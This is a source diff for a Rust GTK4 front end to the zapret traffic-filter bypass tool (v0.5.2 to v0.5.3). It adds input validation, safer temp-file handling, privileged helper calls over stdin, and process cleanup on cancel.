@@ -36,9 +36,9 @@ fn t(s: &str) -> String {
     s.to_string()
 }
 #[derive(Clone, Debug)]
-struct ProfileStrategy {
-    strategy: String,
-    active: bool,
+pub struct ProfileStrategy {
+    pub strategy: String,
+    pub active: bool,
 }
 
 fn get_profile_path(profile_id: usize) -> PathBuf {
@@ -90,14 +90,32 @@ fn save_active_profile_id(id: usize) {
     let _ = fs::write(path, id.to_string());
 }
 
-fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
+pub fn is_safe_strategy_param(input: &str) -> bool {
+    let trimmed = input.trim();
+    if !trimmed.starts_with("--") {
+        return false;
+    }
+    trimmed.chars().all(|c| {
+        c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '=' | '+' | ':' | ',' | '.' | '/' | '<' | '>' | ' ')
+    })
+}
+
+pub fn is_valid_domain(domain: &str) -> bool {
+    let trimmed = domain.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    !trimmed.starts_with("http://") && !trimmed.starts_with("https://") && !trimmed.starts_with("www.")
+}
+
+pub fn parse_strategies_strict(content: &str) -> Result<Vec<ProfileStrategy>, String> {
     let trimmed = content.trim();
     if !trimmed.starts_with('[') || !trimmed.ends_with(']') {
-        return Vec::new();
+        return Err(t("Geçersiz dosya formatı: JSON dizisi [...] formatında olmalıdır."));
     }
-    let inner = &trimmed[1..trimmed.len()-1].trim();
+    let inner = trimmed[1..trimmed.len() - 1].trim();
     if inner.is_empty() {
-        return Vec::new();
+        return Err(t("Dosya içerisinde herhangi bir strateji bulunamadı."));
     }
 
     let config_content = fs::read_to_string("/opt/zapret/config").unwrap_or_default();
@@ -106,6 +124,7 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
     if inner.contains("\"strategy\"") {
         let chars: Vec<char> = inner.chars().collect();
         let mut pos = 0;
+        let mut found_any = false;
         while pos < chars.len() {
             if let Some(start_obj) = chars[pos..].iter().position(|&c| c == '{') {
                 let obj_start = pos + start_obj;
@@ -143,6 +162,7 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
                         }
                     }
                     if !strat_val.is_empty() {
+                        found_any = true;
                         let zapret_base_str = get_zapret_path().to_string_lossy().to_string();
                         let mut fixed_strat = strat_val.replace(&zapret_base_str, "/opt/zapret");
                         if let Some(start) = fixed_strat.find("/home/") {
@@ -150,6 +170,9 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
                                 let old_path = &fixed_strat[start..start + end + 7];
                                 fixed_strat = fixed_strat.replace(old_path, "/opt/zapret");
                             }
+                        }
+                        if !is_safe_strategy_param(&fixed_strat) {
+                            return Err(format!("{}:\n\n{}", t("Güvenlik Uyarısı: Geçersiz veya riskli parametre içeren strateji tespit edildi"), fixed_strat));
                         }
                         results.push(ProfileStrategy {
                             strategy: fixed_strat,
@@ -164,12 +187,14 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
                 break;
             }
         }
-    }
-
-    if results.is_empty() {
+        if !found_any && results.is_empty() {
+            return Err(t("Dosya içerisinde geçerli bir strateji nesnesi bulunamadı."));
+        }
+    } else {
         let mut in_string = false;
         let mut current_strat = String::new();
         let mut is_escaped = false;
+        let mut found_any = false;
         for c in inner.chars() {
             if c == '\\' && !is_escaped {
                 is_escaped = true;
@@ -178,6 +203,7 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
             if c == '"' && !is_escaped {
                 in_string = !in_string;
                 if !in_string && !current_strat.is_empty() {
+                    found_any = true;
                     let zapret_base_str = get_zapret_path().to_string_lossy().to_string();
                     let mut fixed_strat = current_strat.replace(&zapret_base_str, "/opt/zapret");
                     if let Some(start) = fixed_strat.find("/home/") {
@@ -185,6 +211,9 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
                             let old_path = &fixed_strat[start..start + end + 7];
                             fixed_strat = fixed_strat.replace(old_path, "/opt/zapret");
                         }
+                    }
+                    if !is_safe_strategy_param(&fixed_strat) {
+                        return Err(format!("{}:\n\n{}", t("Güvenlik Uyarısı: Geçersiz veya riskli parametre içeren strateji tespit edildi"), fixed_strat));
                     }
                     let is_active = !config_content.is_empty() && config_content.contains(&fixed_strat);
                     results.push(ProfileStrategy {
@@ -198,9 +227,20 @@ fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
             }
             is_escaped = false;
         }
+        if !found_any || results.is_empty() {
+            return Err(t("Dosya içerisinde geçerli bir strateji bulunamadı."));
+        }
     }
 
-    results
+    if results.is_empty() {
+        return Err(t("Dosya içerisinde geçerli bir strateji bulunamadı."));
+    }
+
+    Ok(results)
+}
+
+fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
+    parse_strategies_strict(content).unwrap_or_default()
 }
 
 fn load_profile_strategies(profile_id: usize) -> Vec<ProfileStrategy> {
@@ -332,95 +372,36 @@ fn save_profile_hostlist(profile_id: usize, domains: &[String]) -> io::Result<()
     fs::write(path, content)
 }
 
-fn update_config_mode_filter(content: &str, mode: &str) -> String {
-    let mut lines: Vec<String> = Vec::new();
-    let mut found = false;
-    for line in content.lines() {
-        if line.starts_with("MODE_FILTER=") {
-            lines.push(format!("MODE_FILTER={}", mode));
-            found = true;
-        } else {
-            lines.push(line.to_string());
-        }
-    }
-    if !found {
-        lines.push(format!("MODE_FILTER={}", mode));
-    }
-    lines.join("\n") + "\n"
-}
-
-fn extract_nfqws_opt(content: &str) -> Option<String> {
-    let var_name = "NFQWS_OPT=\"";
-    if let Some(start_idx) = content.find(var_name) {
-        let content_after_start = &content[start_idx + var_name.len()..];
-        let mut end_offset = 0;
-        let mut escaped = false;
-        let mut found = false;
-        for (i, c) in content_after_start.char_indices() {
-            if escaped {
-                escaped = false;
-            } else if c == '\\' {
-                escaped = true;
-            } else if c == '"' {
-                end_offset = i;
-                found = true;
-                break;
-            }
-        }
-        if found {
-            return Some(content_after_start[..end_offset].to_string());
-        }
-    }
-    None
-}
-
 fn apply_profile_hostlist_to_zapret(profile_id: usize) -> io::Result<()> {
     let domains = load_profile_hostlist(profile_id);
-    let runtime_dir = get_secure_runtime_dir();
-    let temp_hosts = runtime_dir.join("zapret_hosts_new");
-    let temp_cfg = runtime_dir.join("zapret_config_new");
-    
-    let mut hosts_content = String::new();
-    for d in &domains {
-        hosts_content.push_str(d);
-        hosts_content.push('\n');
-    }
-    fs::write(&temp_hosts, &hosts_content)?;
-
     let mode_filter = if domains.is_empty() { "none" } else { "hostlist" };
-    let config_path = Path::new("/opt/zapret/config");
-    let content = fs::read_to_string(config_path).or_else(|_| {
-        let out = Command::new("pkexec")
-            .arg(get_zapret_control_path())
-            .arg("cat-config")
-            .output();
-        match out {
-            Ok(o) if o.status.success() => Ok(String::from_utf8_lossy(&o.stdout).to_string()),
-            _ => Err(io::Error::new(io::ErrorKind::NotFound, "Config read failed")),
-        }
-    })?;
 
-    let mut new_content = update_config_mode_filter(&content, mode_filter);
-    if let Some(opt_val) = extract_nfqws_opt(&new_content) {
-        let formatted_opt = format_strategy_with_hostlist(&opt_val);
-        new_content = update_config_content(&new_content, &formatted_opt);
-    }
-    fs::write(&temp_cfg, &new_content)?;
-    let _ = Command::new("pkexec")
+    let mut child = Command::new("pkexec")
         .arg(get_zapret_control_path())
-        .arg("apply-config")
-        .arg(&temp_cfg)
-        .arg(&temp_hosts)
-        .output();
+        .arg("apply-hostlist")
+        .arg(mode_filter)
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()?;
+
+    if let Some(mut stdin) = child.stdin.take() {
+        for d in &domains {
+            let _ = writeln!(stdin, "{}", d);
+        }
+    }
+
+    let output = child.wait_with_output()?;
+    if !output.status.success() {
+        let err = String::from_utf8_lossy(&output.stderr);
+        return Err(io::Error::new(io::ErrorKind::Other, format!("Failed to apply hostlist: {}", err)));
+    }
+
     Ok(())
 }
 
 fn get_zapret_control_path() -> &'static str {
-    if Path::new("/usr/bin/zapret-control").exists() {
-        "/usr/bin/zapret-control"
-    } else {
-        "/opt/zapret/zapret-control.sh"
-    }
+    "/usr/bin/zapret-control"
 }
 
 fn reset_profile_ui_to_1(current_profile_id: &Rc<Cell<usize>>, profile_btns: &[Button]) {
@@ -437,23 +418,46 @@ fn reset_profile_ui_to_1(current_profile_id: &Rc<Cell<usize>>, profile_btns: &[B
 
 fn get_secure_runtime_dir() -> PathBuf {
     let base_dir = std::env::var("XDG_RUNTIME_DIR")
+        .ok()
+        .filter(|s| !s.trim().is_empty())
         .map(PathBuf::from)
-        .unwrap_or_else(|_| {
+        .unwrap_or_else(|| {
             if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
-                proj_dirs.cache_dir().join("runtime")
+                proj_dirs.cache_dir().to_path_buf()
             } else if let Ok(home) = std::env::var("HOME") {
-                PathBuf::from(home).join(".cache").join("zapret-gtk").join("runtime")
+                PathBuf::from(home).join(".cache").join("zapret-gtk")
             } else {
-                std::env::temp_dir()
+                #[cfg(unix)]
+                let uid = unsafe { libc::getuid() };
+                #[cfg(not(unix))]
+                let uid = 1000;
+                PathBuf::from(format!("/tmp/zapret-gtk-{}", uid))
             }
         });
-    let runtime_dir = base_dir.join("zapret-gtk");
-    let _ = fs::create_dir_all(&runtime_dir);
+
+    let runtime_dir = if base_dir.ends_with("zapret-gtk") || base_dir.to_string_lossy().contains("/tmp/zapret-gtk-") {
+        base_dir
+    } else {
+        base_dir.join("zapret-gtk")
+    };
+
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
+        if let Ok(meta) = fs::symlink_metadata(&runtime_dir) {
+            if meta.file_type().is_symlink() {
+                let _ = fs::remove_file(&runtime_dir);
+            }
+        }
+        let _ = fs::create_dir_all(&runtime_dir);
         let _ = fs::set_permissions(&runtime_dir, fs::Permissions::from_mode(0o700));
     }
+
+    #[cfg(not(unix))]
+    {
+        let _ = fs::create_dir_all(&runtime_dir);
+    }
+
     runtime_dir
 }
 
@@ -519,7 +523,7 @@ enum TestMsg {
 fn main() {
     rotate_logs();
     init_i18n();
-    log_to_file("Application started (v0.5.2)");
+    log_to_file("Application started (v0.5.3)");
     ensure_polkit_rules_installed();
     let app = Application::builder()
         .application_id("com.ornek.zapret-gtk")
@@ -1444,9 +1448,10 @@ fn build_ui(app: &Application) {
     let install_cancel_flag = Arc::new(AtomicBool::new(false));
 
     let pid_on_close = current_pid.clone();
-    let cf_on_close = test_cancel_flag.clone();
     let install_pid_on_close = install_child_pid.clone();
+    let cf_on_close = test_cancel_flag.clone();
     let install_cf_on_close = install_cancel_flag.clone();
+    let app_for_close = app.clone();
 
     window.connect_close_request(move |_| {
         cf_on_close.store(true, Ordering::Relaxed);
@@ -1454,11 +1459,31 @@ fn build_ui(app: &Application) {
         let pid_opt = pid_on_close.lock().ok().and_then(|g| *g);
         let inst_pid_opt = install_pid_on_close.lock().ok().and_then(|g| *g);
         let target_pid = pid_opt.or(inst_pid_opt).unwrap_or(0);
-        let _ = Command::new("pkexec")
-            .arg(get_zapret_control_path())
-            .arg("kill-pid")
-            .arg(target_pid.to_string())
-            .spawn();
+
+        let hold_guard = app_for_close.hold();
+        let (tx, rx) = mpsc::channel::<()>();
+
+        thread::spawn(move || {
+            let _ = Command::new("pkexec")
+                .arg(get_zapret_control_path())
+                .arg("cleanup-session")
+                .arg(target_pid.to_string())
+                .output();
+
+            let _ = tx.send(());
+        });
+
+        let mut guard_opt = Some(hold_guard);
+        glib::timeout_add_local(Duration::from_millis(30), move || {
+            match rx.try_recv() {
+                Ok(()) | Err(mpsc::TryRecvError::Disconnected) => {
+                    guard_opt.take();
+                    glib::ControlFlow::Break
+                }
+                Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
+            }
+        });
+
         glib::Propagation::Proceed
     });
 
@@ -1514,10 +1539,16 @@ fn build_ui(app: &Application) {
 
     let upd_action_sender_click = upd_action_sender.clone();
     update_service_btn.connect_clicked(move |_| {
+        let commit_hash_opt = get_zapret_remote_commit_hash();
+        let commit_info = match &commit_hash_opt {
+            Some(h) => format!("\n\n(Hedef Sürüm: {})", &h[..7.min(h.len())]),
+            None => String::new(),
+        };
+        let body_text = format!("{}{}", t("Zapret'in en son sürümü indirilip yeniden derlenecek ve servis yeniden başlatılacak. Devam edilsin mi?"), commit_info);
         let dialog = adw::MessageDialog::builder()
             .transient_for(&win_update)
             .heading(&t("Zapret Güncellemesi"))
-            .body(&t("Zapret'in en son sürümü indirilip yeniden derlenecek ve servis yeniden başlatılacak. Devam edilsin mi?"))
+            .body(&body_text)
             .build();
         dialog.add_response("cancel", &t("İptal"));
         dialog.add_response("update", &t("Güncelle"));
@@ -2010,7 +2041,7 @@ fn build_ui(app: &Application) {
             .transient_for(&win_about)
             .modal(true)
             .program_name("Zapret GTK")
-            .version("0.5.2")
+            .version("0.5.3")
             .logo(&texture)
             .comments(&t("Zapret için modern GTK4 arayüzü."))
             .website("https://github.com/Taygun86/zapret-gtk")
@@ -2332,92 +2363,108 @@ fn build_ui(app: &Application) {
             dialog.present();
             return;
         }
-        let combined_strategies = selected_strategies.join(" ");
-        println!("Applying profile {}: {}", current_id, combined_strategies);
-        log_to_file(&format!("Applying profile {} strategies: {}", current_id, combined_strategies));
-        
-        let config_path = Path::new("/opt/zapret/config");
-        let content_opt = fs::read_to_string(config_path).ok().or_else(|| {
-            let out = Command::new("pkexec")
-                .arg(get_zapret_control_path())
-                .arg("cat-config")
-                .output();
-            match out {
-                Ok(o) if o.status.success() => Some(String::from_utf8_lossy(&o.stdout).to_string()),
-                _ => None,
-            }
-        });
-             
-        match content_opt {
-            Some(content) => {
-                let new_content = update_config_content(&content, &combined_strategies);
-                let domains = load_profile_hostlist(current_id);
-                let mode_filter = if domains.is_empty() { "none" } else { "hostlist" };
-                let new_content = update_config_mode_filter(&new_content, mode_filter);
 
-                let runtime_dir = get_secure_runtime_dir();
-                let temp_path = runtime_dir.join("zapret_config_new");
-                let temp_hosts = runtime_dir.join("zapret_hosts_new");
-
-                let mut hosts_content = String::new();
-                for d in &domains {
-                    hosts_content.push_str(d);
-                    hosts_content.push('\n');
-                }
-                let _ = fs::write(&temp_hosts, &hosts_content);
-                let _ = fs::write(&temp_path, &new_content);
-
-                let res = Command::new("pkexec")
-                    .arg(get_zapret_control_path())
-                    .arg("apply-config")
-                    .arg(&temp_path)
-                    .arg(&temp_hosts)
-                    .output();
-                    
-                match res {
-                    Ok(output) if output.status.success() => {
-                        log_to_file("Config file updated successfully and service restarted.");
-                        save_active_profile_id(current_id);
-                        let dialog = adw::MessageDialog::builder()
-                            .transient_for(&win_apply)
-                            .heading(&t("Başarılı"))
-                            .body(&t("Profil {} stratejileri uygulandı ve Zapret servisi yeniden başlatıldı.").replace("{}", &current_id.to_string()))
-                            .build();
-                        dialog.add_response("ok", &t("Tamam"));
-                        dialog.present();
-                    },
-                    Ok(output) => {
-                         let err = String::from_utf8_lossy(&output.stderr);
-                         log_to_file(&format!("Service start error: {}", err));
-                         let dialog = adw::MessageDialog::builder()
-                            .transient_for(&win_apply)
-                            .heading(&t("Hata"))
-                            .body(&t("Servis başlatılamadı:\n{}").replace("{}", &err))
-                            .build();
-                        dialog.add_response("ok", &t("Tamam"));
-                        dialog.present();
-                    },
-                    Err(e) => {
-                         let dialog = adw::MessageDialog::builder()
-                            .transient_for(&win_apply)
-                            .heading(&t("Hata"))
-                            .body(&t("Komut hatası: {}").replace("{}", &e.to_string()))
-                            .build();
-                        dialog.add_response("ok", &t("Tamam"));
-                        dialog.present();
-                    }
-                }
-            },
-            None => {
-                 let dialog = adw::MessageDialog::builder()
+        for strat in &selected_strategies {
+            if !is_safe_strategy_param(strat) {
+                let dialog = adw::MessageDialog::builder()
                     .transient_for(&win_apply)
-                    .heading(&t("Okuma Hatası"))
-                    .body(&t("Config dosyası okunamadı veya Zapret kurulu değil."))
+                    .heading(&t("Güvenlik Uyarısı"))
+                    .body(&t("Geçersiz veya güvensiz karakterler içeren strateji tespit edildi."))
                     .build();
                 dialog.add_response("ok", &t("Tamam"));
                 dialog.present();
+                return;
             }
         }
+
+        let combined_strategies = selected_strategies.join(" ");
+        let formatted_strat = format_strategy_with_hostlist(&combined_strategies);
+        if !is_safe_strategy_param(&formatted_strat) {
+            let dialog = adw::MessageDialog::builder()
+                .transient_for(&win_apply)
+                .heading(&t("Güvenlik Uyarısı"))
+                .body(&t("Biçimlendirilmiş strateji geçerli değil."))
+                .build();
+            dialog.add_response("ok", &t("Tamam"));
+            dialog.present();
+            return;
+        }
+
+        println!("Applying profile {}: {}", current_id, formatted_strat);
+        log_to_file(&format!("Applying profile {} strategies: {}", current_id, formatted_strat));
+
+        let mut strat_child = match Command::new("pkexec")
+            .arg(get_zapret_control_path())
+            .arg("apply-strategy")
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn() {
+                Ok(c) => c,
+                Err(e) => {
+                    let dialog = adw::MessageDialog::builder()
+                        .transient_for(&win_apply)
+                        .heading(&t("Hata"))
+                        .body(&t("Komut hatası: {}").replace("{}", &e.to_string()))
+                        .build();
+                    dialog.add_response("ok", &t("Tamam"));
+                    dialog.present();
+                    return;
+                }
+            };
+
+        if let Some(mut stdin) = strat_child.stdin.take() {
+            let _ = writeln!(stdin, "{}", formatted_strat);
+        }
+
+        let strat_res = strat_child.wait_with_output();
+        match strat_res {
+            Ok(output) if output.status.success() => {},
+            Ok(output) => {
+                let err = String::from_utf8_lossy(&output.stderr);
+                log_to_file(&format!("Apply strategy error: {}", err));
+                let dialog = adw::MessageDialog::builder()
+                    .transient_for(&win_apply)
+                    .heading(&t("Hata"))
+                    .body(&t("Strateji uygulanamadı:\n{}").replace("{}", &err))
+                    .build();
+                dialog.add_response("ok", &t("Tamam"));
+                dialog.present();
+                return;
+            },
+            Err(e) => {
+                let dialog = adw::MessageDialog::builder()
+                    .transient_for(&win_apply)
+                    .heading(&t("Hata"))
+                    .body(&t("Komut hatası: {}").replace("{}", &e.to_string()))
+                    .build();
+                dialog.add_response("ok", &t("Tamam"));
+                dialog.present();
+                return;
+            }
+        }
+
+        if let Err(e) = apply_profile_hostlist_to_zapret(current_id) {
+            log_to_file(&format!("Apply hostlist error: {}", e));
+            let dialog = adw::MessageDialog::builder()
+                .transient_for(&win_apply)
+                .heading(&t("Hata"))
+                .body(&t("Hostlist uygulanamadı:\n{}").replace("{}", &e.to_string()))
+                .build();
+            dialog.add_response("ok", &t("Tamam"));
+            dialog.present();
+            return;
+        }
+
+        log_to_file("Config file updated successfully and service restarted.");
+        save_active_profile_id(current_id);
+        let dialog = adw::MessageDialog::builder()
+            .transient_for(&win_apply)
+            .heading(&t("Başarılı"))
+            .body(&t("Profil {} stratejileri uygulandı ve Zapret servisi yeniden başlatıldı.").replace("{}", &current_id.to_string()))
+            .build();
+        dialog.add_response("ok", &t("Tamam"));
+        dialog.present();
     });
     let active_profile_init = get_active_profile_id();
     if Path::new("/opt/zapret").exists() && (get_config_path().exists() || get_profile_path(1).exists()) {
@@ -3094,15 +3141,8 @@ fn build_ui(app: &Application) {
 
 fn validate_and_copy_strategies(path: &Path, target_profile_id: usize) -> io::Result<()> {
     let content = fs::read_to_string(path)?;
-    let strategies = parse_strategies_from_content(&content);
-    if strategies.is_empty() {
-        return Err(io::Error::new(io::ErrorKind::InvalidData, t("Dosya içerisinde strateji bulunamadı.")));
-    }
-    for s in &strategies {
-        if !s.strategy.trim().starts_with("--") {
-            return Err(io::Error::new(io::ErrorKind::InvalidData, t("Geçersiz strateji: '{}'. Stratejiler '--' ile başlamalıdır.").replace("{}", &s.strategy)));
-        }
-    }
+    let strategies = parse_strategies_strict(&content)
+        .map_err(|err_msg| io::Error::new(io::ErrorKind::InvalidData, err_msg))?;
     save_profile_strategies(target_profile_id, &strategies)?;
     Ok(())
 }
@@ -3125,46 +3165,20 @@ fn format_strategy_with_hostlist(strategy_str: &str) -> String {
     formatted_parts.join(" --new ")
 }
 
-fn update_config_content(content: &str, new_opt: &str) -> String {
-    let formatted_opt = format_strategy_with_hostlist(new_opt);
-    let var_name = "NFQWS_OPT=\"";
-    if let Some(start_idx) = content.find(var_name) {
-        let content_after_start = &content[start_idx + var_name.len()..];
-        let mut end_offset = 0;
-        let mut escaped = false;
-        let mut found = false;
-        for (i, c) in content_after_start.char_indices() {
-            if escaped {
-                escaped = false;
-            } else {
-                if c == '\\' {
-                    escaped = true;
-                } else if c == '"' {
-                    end_offset = i;
-                    found = true;
-                    break;
-                }
-            }
-        }
-        if found {
-            let prefix = &content[..start_idx];
-            let suffix = &content_after_start[end_offset + 1..];
-            return format!("{}NFQWS_OPT=\"{}\"{}", prefix, formatted_opt, suffix);
-        }
-    }
-    let var_name_single = "NFQWS_OPT='";
-    if let Some(start_idx) = content.find(var_name_single) {
-        let content_after_start = &content[start_idx + var_name_single.len()..];
-         if let Some(end_offset) = content_after_start.find('\'') {
-             let prefix = &content[..start_idx];
-             let suffix = &content_after_start[end_offset + 1..];
-             return format!("{}NFQWS_OPT=\"{}\"{}", prefix, formatted_opt, suffix);
-         }
-    }
-    format!("{}\nNFQWS_OPT=\"{}\"\n", content, formatted_opt)
-}
 fn run_blockcheck_process(domains: Vec<String>, repeats: usize, scan_level: String, sender: mpsc::Sender<TestMsg>, cancel_flag: Arc<AtomicBool>) {
-    let domains_str = domains.join(" ");
+    let valid_domains: Vec<String> = domains
+        .into_iter()
+        .map(|d| d.trim().to_string())
+        .filter(|d| !d.is_empty() && !d.starts_with("http://") && !d.starts_with("https://") && !d.starts_with("www."))
+        .collect();
+    if valid_domains.is_empty() {
+        let err_msg = t("Geçerli test edilecek alan adı bulunamadı.");
+        log_to_file(&format!("Error: {}", err_msg));
+        let _ = sender.send(TestMsg::Finished(Err(io::Error::new(io::ErrorKind::InvalidInput, err_msg))));
+        return;
+    }
+
+    let domains_str = valid_domains.join(" ");
     log_to_file(&format!("Blockcheck started. Level: {}, Repeat: {}, Domains: {}", scan_level, repeats, domains_str));
 
     let _ = Command::new("pkexec")
@@ -3179,14 +3193,14 @@ fn run_blockcheck_process(domains: Vec<String>, repeats: usize, scan_level: Stri
         let _ = sender.send(TestMsg::Finished(Err(io::Error::new(io::ErrorKind::NotFound, err_msg))));
         return;
     }
-    println!("Executing blockcheck via zapret-control.sh");
-    log_to_file("Executing blockcheck via zapret-control.sh");
+    println!("Executing blockcheck via zapret-control");
+    log_to_file("Executing blockcheck via zapret-control");
     let mut child = match Command::new("pkexec")
         .arg(get_zapret_control_path())
         .arg("blockcheck")
         .arg(repeats.to_string())
         .arg(scan_level)
-        .args(&domains)
+        .args(&valid_domains)
         .stdout(Stdio::piped()) 
         .spawn() {
             Ok(c) => c,
@@ -3261,7 +3275,9 @@ fn run_blockcheck_process(domains: Vec<String>, repeats: usize, scan_level: Stri
                 if let Some(idx) = trimmed.find("nfqws ") {
                     if !trimmed.contains("checking") && !trimmed.contains(">>") && !trimmed.contains("not working") {
                         let strategy = trimmed[idx + 6..].trim().to_string();
-                        strategies.push(strategy);
+                        if is_safe_strategy_param(&strategy) {
+                            strategies.push(strategy);
+                        }
                     }
                 }
             }
@@ -3272,7 +3288,7 @@ fn run_blockcheck_process(domains: Vec<String>, repeats: usize, scan_level: Stri
                  if let Some(idx) = trimmed.find("nfqws ") {
                      if !trimmed.contains("checking") && !trimmed.contains(">>") && !trimmed.contains("not working") {
                         let strategy = trimmed[idx + 6..].trim().to_string();
-                        if !strategies.contains(&strategy) {
+                        if is_safe_strategy_param(&strategy) && !strategies.contains(&strategy) {
                             strategies.push(strategy);
                         }
                      }
@@ -3292,17 +3308,9 @@ fn run_easy_install_script(sender: mpsc::Sender<TestMsg>, cancel_flag: Arc<Atomi
         let _ = sender.send(TestMsg::InstallFinished(Err(io::Error::new(io::ErrorKind::NotFound, t("install_easy.sh bulunamadı")))));
         return;
     }
-    let inputs = "Y\nY\nN\n1\nN\nN\nY\nN\n\n\n";
-    let input_path = get_secure_runtime_dir().join("zapret_install_inputs.txt");
-    if let Err(e) = fs::write(&input_path, inputs) {
-         let _ = sender.send(TestMsg::InstallFinished(Err(e)));
-         return;
-    }
-    let input_str = input_path.to_string_lossy().to_string();
     let mut child = match Command::new("pkexec")
         .arg(get_zapret_control_path())
         .arg("easy-install")
-        .arg(&input_str)
         .stdout(Stdio::piped())
         .stderr(Stdio::inherit()) 
         .spawn() {
@@ -3317,7 +3325,13 @@ fn run_easy_install_script(sender: mpsc::Sender<TestMsg>, cancel_flag: Arc<Atomi
         let reader = BufReader::new(stdout);
         for line_result in reader.lines() {
             if cancel_flag.load(Ordering::Relaxed) {
+                let _ = Command::new("pkexec")
+                    .arg(get_zapret_control_path())
+                    .arg("kill-pid")
+                    .arg(child.id().to_string())
+                    .output();
                 let _ = child.kill();
+                let _ = child.wait();
                 return;
             }
             if let Ok(line) = line_result {
@@ -3612,13 +3626,20 @@ fn run_installation(btn: Button, pb: ProgressBar, lbl: Label, placeholder: Label
         {
             let _ = sender.send(AppMsg::Status(t("Yetki onayı bekleniyor...")));
             let script_path = get_secure_runtime_dir().join("zapret_installer_job.sh");
-            if let Ok(mut file) = fs::File::create(&script_path) {
-                #[cfg(unix)]
+            #[cfg(unix)]
+            {
+                use std::fs::OpenOptions;
+                use std::os::unix::fs::OpenOptionsExt;
+                let _ = fs::remove_file(&script_path);
+                if let Ok(mut file) = OpenOptions::new()
+                    .write(true)
+                    .create(true)
+                    .truncate(true)
+                    .mode(0o700)
+                    .open(&script_path)
                 {
-                    use std::os::unix::fs::PermissionsExt;
-                    let _ = file.set_permissions(fs::Permissions::from_mode(0o700));
+                    let _ = file.write_all(root_commands.as_bytes());
                 }
-                let _ = file.write_all(root_commands.as_bytes());
             }
             println!("--- Installer Script Content ---\n{}\n--------------------------------", root_commands);
             log_to_file(&format!("--- Installer Script Content ---\n{}\n--------------------------------", root_commands));
@@ -3633,7 +3654,17 @@ fn run_installation(btn: Button, pb: ProgressBar, lbl: Label, placeholder: Label
             if let Some(stdout) = child.stdout.take() {
                 let reader = BufReader::new(stdout);
                 for line in reader.lines() {
-                    if cancel_flag_thread.load(Ordering::Relaxed) { break; }
+                    if cancel_flag_thread.load(Ordering::Relaxed) {
+                        let _ = Command::new("pkexec")
+                            .arg(get_zapret_control_path())
+                            .arg("kill-pid")
+                            .arg(child.id().to_string())
+                            .output();
+                        let _ = child.kill();
+                        let _ = child.wait();
+                        let _ = fs::remove_file(&script_path);
+                        return;
+                    }
                     if let Ok(l) = line {
                         println!("[Installer]: {}", l);
                         log_to_file(&format!("[Installer]: {}", l));
@@ -3661,6 +3692,14 @@ fn run_installation(btn: Button, pb: ProgressBar, lbl: Label, placeholder: Label
                 }
             }
             if cancel_flag_thread.load(Ordering::Relaxed) {
+                let _ = Command::new("pkexec")
+                    .arg(get_zapret_control_path())
+                    .arg("kill-pid")
+                    .arg(child.id().to_string())
+                    .output();
+                let _ = child.kill();
+                let _ = child.wait();
+                let _ = fs::remove_file(&script_path);
                 return; 
             }
             let status = child.wait();
@@ -3745,37 +3784,46 @@ fn run_installation(btn: Button, pb: ProgressBar, lbl: Label, placeholder: Label
 }
 fn ensure_polkit_rules_installed() {
     let control_file = Path::new("/usr/bin/zapret-control");
+    let rule_file = Path::new("/run/polkit-1/rules.d/90-zapret-gtk.rules");
     let control_content = fs::read_to_string(control_file).unwrap_or_default();
-    if control_file.exists() && control_content.contains("# VERSION: 3") && control_content.contains("pkill -9 -P") {
+    if control_file.exists() && control_content.contains("# VERSION: 8") && control_content.contains("apply-strategy") && rule_file.exists() {
         return;
     }
     if !Path::new("/opt/zapret").exists() {
         return;
     }
-    log_to_file("Polkit rules not found or outdated. Installing restricted authorization rule on startup...");
+    log_to_file("Ephemeral Polkit rule not active. Initializing runtime authorization on startup...");
     let script = get_polkit_setup_script();
     let temp_script = get_secure_runtime_dir().join("zapret_polkit_init.sh");
-    if let Ok(mut f) = fs::File::create(&temp_script) {
-        #[cfg(unix)]
+    #[cfg(unix)]
+    {
+        use std::fs::OpenOptions;
+        use std::os::unix::fs::OpenOptionsExt;
+        let _ = fs::remove_file(&temp_script);
+        if let Ok(mut f) = OpenOptions::new()
+            .write(true)
+            .create(true)
+            .truncate(true)
+            .mode(0o700)
+            .open(&temp_script)
         {
-            use std::os::unix::fs::PermissionsExt;
-            let _ = f.set_permissions(fs::Permissions::from_mode(0o700));
+            let _ = f.write_all(format!("#!/bin/sh\nset -e\n{}\nrm -f \"{}\"\n", script, temp_script.display()).as_bytes());
+            let _ = Command::new("pkexec")
+                .arg("/bin/sh")
+                .arg(&temp_script)
+                .output();
         }
-        let _ = f.write_all(format!("#!/bin/sh\nset -e\n{}\nrm -f \"{}\"\n", script, temp_script.display()).as_bytes());
-        let _ = Command::new("chmod").arg("+x").arg(&temp_script).output();
-        let _ = Command::new("pkexec")
-            .arg("/bin/sh")
-            .arg(&temp_script)
-            .output();
     }
 }
 
 fn get_polkit_setup_script() -> &'static str {
-    r#"mkdir -p /opt/zapret /etc/polkit-1/rules.d /usr/bin 2>/dev/null || true
+    r#"mkdir -p /opt/zapret /run/polkit-1/rules.d /etc/polkit-1/rules.d /usr/bin 2>/dev/null || true
+rm -f /etc/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
 cat << 'EOF' > /usr/bin/zapret-control
 #!/bin/sh
-# VERSION: 3
+# VERSION: 8
 set -e
+export LC_ALL=C
 
 restart_service() {
     systemctl restart zapret 2>/dev/null || rc-service zapret restart 2>/dev/null || sv restart zapret 2>/dev/null || service zapret restart 2>/dev/null || dinitctl restart zapret 2>/dev/null || true
@@ -3787,6 +3835,31 @@ stop_service() {
 
 start_service() {
